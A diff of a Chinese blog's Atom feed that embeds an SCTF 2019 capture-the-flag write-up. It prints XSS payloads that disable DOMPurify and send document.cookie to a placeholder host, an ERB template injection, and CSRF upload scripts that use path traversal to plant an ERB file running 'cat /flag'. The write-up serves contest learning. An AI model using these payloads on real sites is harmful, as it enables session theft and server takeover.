@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.codemonster.cn/"/>
-  <updated>2019-06-24T09:26:33.090Z</updated>
+  <updated>2019-06-24T09:29:03.369Z</updated>
   <id>https://www.codemonster.cn/</id>
   
   <author>
@@ -17,10 +17,10 @@
   
   <entry>
     <title>2019 SCTF 部分 WriteUp</title>
-    <link href="https://www.codemonster.cn/2019/06/24/2019-hctf-web-writeup/"/>
-    <id>https://www.codemonster.cn/2019/06/24/2019-hctf-web-writeup/</id>
+    <link href="https://www.codemonster.cn/2019/06/24/2019-sctf-writeup/"/>
+    <id>https://www.codemonster.cn/2019/06/24/2019-sctf-writeup/</id>
     <published>2019-06-24T06:42:59.000Z</published>
-    <updated>2019-06-24T09:26:33.090Z</updated>
+    <updated>2019-06-24T09:29:03.369Z</updated>
     
     <content type="html"><![CDATA[<p>刚刚毕业，正好周末遇上SCTF，打了两天，这里记录一下做的几道题<br><a id="more"></a></p>
 <h2 id="math-is-fun1"><a href="#math-is-fun1" class="headerlink" title="math-is-fun1"></a>math-is-fun1</h2><p>题目给了个在线编辑器<br><a href="http://47.110.128.101/challenge?name=Challenger" target="_blank" rel="noopener">http://47.110.128.101/challenge?name=Challenger</a><br>可以提交一个url到服务器，结合hint确定是要xss了<br><a href="http://47.110.128.101/send_message.html" target="_blank" rel="noopener">http://47.110.128.101/send_message.html</a></p>
@@ -41,11 +41,11 @@
 </li>
 </ul>
 <p>猜测是要覆盖DOMPurify的某些变量，能够使其失效，翻看Dompurify的源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/cure53/DOMPurify/blob/c57dd450d8613fddfda67ad182526f371b4638fd/src/purify.js :966</div></pre></td></tr></table></figure></p>
-<p><img src="/img/2019-sctf-1.png" alt=""><br>当<code>DOMPurify.isSupported</code>为<code>false</code>，则能够绕过过滤<br>于是构造<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=&lt;script&gt;alert(1)</div></pre></td></tr></table></figure></p>
+<p><img src="/img/2019-sctf-1.png" alt=""><br>当<code>DOMPurify.isSupported</code>为<code>false</code>，则能够绕过过滤<br>于是构造<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span></span></div></pre></td></tr></table></figure></p>
 <p>把<code>DOMPurify.isSupported</code>设置为false，text参数的值就能直接插入页面中，造成xss<br>（这里不知道为啥<code>text=&lt;script&gt;alert(1)</code>直接就绕过csp弹窗了，可能是非预期<br><img src="/img/2019-sctf-2.png" alt=""></p>
-<p>最后payload：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=&lt;script&gt;window.location.href%3d"http://xxxx.xxxx/?a%3d"%2bescape(document.cookie)</div></pre></td></tr></table></figure></p>
+<p>最后payload：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href%<span class="number">3</span>d<span class="string">"http://xxxx.xxxx/?a%3d"</span>%<span class="number">2</span>bescape(<span class="built_in">document</span>.cookie)</span></span></div></pre></td></tr></table></figure></p>
 <p>两题都可以用这个paylaod打<br><img src="/img/2019-sctf-3.png" alt=""></p>
-<h2 id="math-is-fun2"><a href="#math-is-fun2" class="headerlink" title="math-is-fun2"></a>math-is-fun2</h2><p>题解同上，<br>payload：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=&lt;script&gt;window.location.href%3d"http://xxxx.xxxx/?a%3d"%2bescape(document.cookie)</div></pre></td></tr></table></figure></p>
+<h2 id="math-is-fun2"><a href="#math-is-fun2" class="headerlink" title="math-is-fun2"></a>math-is-fun2</h2><p>题解同上，<br>payload：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href%<span class="number">3</span>d<span class="string">"http://xxxx.xxxx/?a%3d"</span>%<span class="number">2</span>bescape(<span class="built_in">document</span>.cookie)</span></span></div></pre></td></tr></table></figure></p>
 <h2 id="flag-shop"><a href="#flag-shop" class="headerlink" title="flag shop"></a>flag shop</h2><p>robots.txt提示/filebak，访问后拿到源码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'erb'</span></div><div class="line"></div><div class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/static'</span></div><div class="line"></div><div class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></div><div class="line"><span class="comment">#ENV["SECRET"] = SecureRandom.hex(xx)</span></div><div class="line"></div><div class="line">configure <span class="keyword">do</span></div><div class="line"> enable <span class="symbol">:logging</span></div><div class="line"> file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</div><div class="line"> file.sync = <span class="literal">true</span></div><div class="line"> use Rack::CommonLogger, file</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/"</span> <span class="keyword">do</span></div><div class="line"> redirect <span class="string">'/shop'</span>, <span class="number">302</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></div><div class="line"> content_type <span class="symbol">:text</span></div><div class="line"> erb IO.binread __FILE_<span class="number">_</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></div><div class="line"> payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</div><div class="line"> auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></div><div class="line"> cookies[<span class="symbol">:auth</span>] = auth</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></div><div class="line"> islogin</div><div class="line"> auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</div><div class="line"> json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></div><div class="line"> erb <span class="symbol">:shop</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></div><div class="line"> islogin</div><div class="line"> auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</div><div class="line"> auth = auth[<span class="number">0</span>]</div><div class="line"> <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</div><div class="line">   <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</div><div class="line">     puts ENV[<span class="string">"FLAG"</span>]</div><div class="line">   <span class="keyword">end</span></div><div class="line"> <span class="keyword">end</span></div><div class="line"></div><div class="line"> <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></div><div class="line"></div><div class="line">   auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</div><div class="line">   auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></div><div class="line">   cookies[<span class="symbol">:auth</span>] = auth</div><div class="line">   ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</div><div class="line"></div><div class="line"> <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></div><div class="line"> islogin</div><div class="line"> auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</div><div class="line"></div><div class="line"> <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></div><div class="line"></div><div class="line">   json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</div><div class="line"> <span class="keyword">else</span></div><div class="line"></div><div class="line">   auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</div><div class="line">   auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></div><div class="line">   cookies[<span class="symbol">:auth</span>] = auth</div><div class="line">   json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</div><div class="line"> <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></div><div class="line"> <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></div><div class="line">   redirect to(<span class="string">'/shop'</span>)</div><div class="line"> <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
 <p>发现<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</div></pre></td></tr></table></figure></p>
 <p>存在erb模版注入，构造name为 <code>&lt;%=$~%&gt;</code>，do为<code>&lt;%=$~%&gt; is working</code>，结合<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)，</div></pre></td></tr></table></figure></p>
@@ -65,9 +65,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
   </entry>
   
@@ -212,10 +212,10 @@
 <li>CSRF 调用/file/Alpha_test 接口把文件分配到自己的id下，在/Alphatest拿到生成的文件名</li>
 <li>主页文件包含，RCE</li>
 </ol>
-<p>于是开始了艰难的构造payload<br>最后上传的payload如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">function upload(i) &#123;</span></div><div class="line"><span class="undefined">var test=$('meta').eq(1).attr("content");</span></div><div class="line"><span class="undefined">var url="/file/upload";</span></div><div class="line"><span class="undefined">  var data="-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\"\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Type: application/text\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[context]\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">de1ta\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"authenticity_token\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">"+test+"\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"commit\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">submit\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"utf8\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">✓\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835--";</span></div><div class="line"><span class="undefined">  $.ajax(&#123;</span></div><div class="line"><span class="undefined">   url: url,</span></div><div class="line"><span class="undefined">   type:"POST",</span></div><div class="line"><span class="undefined">   headers: &#123;</span></div><div class="line"><span class="undefined">       "Content-Type": "multipart/form-data; boundary=---------------------------13025814701038468772945051835",</span></div><div class="line"><span class="undefined">       "Upgrade-Insecure-Requests":"1"</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="undefined">   data:data,</span></div><div class="line"><span class="undefined">   contentType:false,</span></div><div class="line"><span class="undefined">   success:function(res)&#123;</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="undefined">   error:function(err)&#123;</span></div><div class="line"><span class="undefined">   &#125;</span></div><div class="line"><span class="undefined">  &#125;)</span></div><div class="line"><span class="undefined"> &#125;</span></div><div class="line"><span class="undefined"> for(var i=1;i&lt;2;i++)</span></div><div class="line"><span class="undefined"> &#123;</span></div><div class="line"><span class="undefined">    upload(i);</span></div><div class="line"><span class="undefined"> &#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>于是开始了艰难的构造payload<br>最后上传的payload如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">i</span>) </span>&#123;</span></div><div class="line"><span class="javascript"><span class="keyword">var</span> test=$(<span class="string">'meta'</span>).eq(<span class="number">1</span>).attr(<span class="string">"content"</span>);</span></div><div class="line"><span class="javascript"><span class="keyword">var</span> url=<span class="string">"/file/upload"</span>;</span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> data=<span class="string">"-----------------------------13025814701038468772945051835\x0d\x0a\</span></span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\"\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Type: application/text\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[context]\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">de1ta\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"authenticity_token\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="javascript"><span class="string">"+test+"</span>\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"commit\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">submit\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"utf8\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">✓\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835--";</span></div><div class="line"><span class="javascript">  $.ajax(&#123;</span></div><div class="line"><span class="undefined">   url: url,</span></div><div class="line"><span class="javascript">   type:<span class="string">"POST"</span>,</span></div><div class="line"><span class="undefined">   headers: &#123;</span></div><div class="line"><span class="javascript">       <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data; boundary=---------------------------13025814701038468772945051835"</span>,</span></div><div class="line"><span class="javascript">       <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span></span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="undefined">   data:data,</span></div><div class="line"><span class="javascript">   contentType:<span class="literal">false</span>,</span></div><div class="line"><span class="javascript">   success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="javascript">   error:<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span></div><div class="line"><span class="undefined">   &#125;</span></div><div class="line"><span class="undefined">  &#125;)</span></div><div class="line"><span class="undefined"> &#125;</span></div><div class="line"><span class="javascript"> <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">2</span>;i++)</span></div><div class="line"><span class="undefined"> &#123;</span></div><div class="line"><span class="undefined">    upload(i);</span></div><div class="line"><span class="undefined"> &#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>文件内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%= `cat /flag` %&gt;</div></pre></td></tr></table></figure></p>
 <p>文件名为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">../../app/views/home/de1taxishir.erbss.erb</div></pre></td></tr></table></figure></p>
-<p>推送文件到我的uid下的代码为：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">function go(fffid)&#123;</span></div><div class="line"><span class="undefined">  var test=$('meta').eq(1).attr("content");</span></div><div class="line"><span class="undefined">  console.log(test);</span></div><div class="line"><span class="undefined">  var params = &#123;utf8:"\xE2\x9C\x93",authenticity_token:test,uid:2,fid:fffid,commit:"submit"&#125;;</span></div><div class="line"><span class="undefined">  var url = '/file/Alpha_test';</span></div><div class="line"><span class="undefined">$.ajax(&#123;</span></div><div class="line"><span class="undefined">   url : url,</span></div><div class="line"><span class="undefined">   type : "POST",</span></div><div class="line"><span class="undefined">   data : params,</span></div><div class="line"><span class="undefined">   success : function(result) &#123;</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="undefined">   error:function(result)&#123;</span></div><div class="line"><span class="undefined">   &#125;</span></div><div class="line"><span class="undefined"> &#125;)</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">for(var i=1;i&lt;20;i+=1)&#123;</span></div><div class="line"><span class="undefined">  go(i);</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>推送文件到我的uid下的代码为：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params">fffid</span>)</span>&#123;</span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> test=$(<span class="string">'meta'</span>).eq(<span class="number">1</span>).attr(<span class="string">"content"</span>);</span></div><div class="line"><span class="javascript">  <span class="built_in">console</span>.log(test);</span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> params = &#123;<span class="attr">utf8</span>:<span class="string">"\xE2\x9C\x93"</span>,<span class="attr">authenticity_token</span>:test,<span class="attr">uid</span>:<span class="number">2</span>,<span class="attr">fid</span>:fffid,<span class="attr">commit</span>:<span class="string">"submit"</span>&#125;;</span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> url = <span class="string">'/file/Alpha_test'</span>;</span></div><div class="line"><span class="javascript">$.ajax(&#123;</span></div><div class="line"><span class="undefined">   url : url,</span></div><div class="line"><span class="javascript">   type : <span class="string">"POST"</span>,</span></div><div class="line"><span class="undefined">   data : params,</span></div><div class="line"><span class="javascript">   success : <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span></div><div class="line"><span class="undefined">   &#125;,</span></div><div class="line"><span class="javascript">   error:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span></div><div class="line"><span class="undefined">   &#125;</span></div><div class="line"><span class="undefined"> &#125;)</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">20</span>;i+=<span class="number">1</span>)&#123;</span></div><div class="line"><span class="undefined">  go(i);</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span><span 